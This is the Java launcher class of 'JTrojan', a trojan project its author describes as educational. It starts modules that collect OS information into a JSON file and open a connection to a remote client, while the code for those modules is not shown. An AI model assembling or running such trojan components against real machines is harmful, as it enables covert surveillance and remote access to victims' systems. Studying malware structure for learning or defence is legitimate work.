/**
 * @Description:        Install class would to instanciate each class needed for JTrojan project
 *                      Trojan program is only used to learn to you and I what is a trojan, in Java
 *                      Be careful with the law
 * @Author:             Quentin Le Bian <quentpilot>
 * @Email:              quentin.lebian@pilotaweb.fr
 * @Project:            JTrojan
 * @About:              You're welcome to hack and code as your are each of theses sources files <3:p|--<;
 * @Filename:           Install.java
 * @Date:               2017-10-19T15:20:14+02:00
 * @Last modified by:   quentpilot
 * @Last modified time: 2017-10-19T16:50:18+02:00
 * @License:            MIT
 * @See:                projects.quentinlebian.fr/JTrojan
 */


package Trojan.Installer;

import Trojan.Connect.Connection;
import Trojan.Installer.Infos;
import Trojan.Installer.Trojan;

public class Install {

  /**
  * Main method which would to instanciate Trojan classes
  *
  * @param options
  *                Used to set some options when install Trojan
  *
  * @see Trojan#Trojan(String[] params)
  */
    public static void      main(String[] options) {
        Trojan        trojan = new Trojan(options);
        Connection    connection = new Connection();

        if (!trojan.run()) {
            Trojan.println("!!! An Error has been catch when trying to set OS infos !!!");
            return;
        }

        Trojan.println("*** JSON OS infos file would be set! ***");

        if (!connection.run()) {
            Trojan.println("!!! An Error has been catch when trying to run connection !!!");
            return;
        }

        Trojan.println("*** Connection to client would be done! ***\n");
        Trojan.println(connection.getInfos().toString());
    }
}
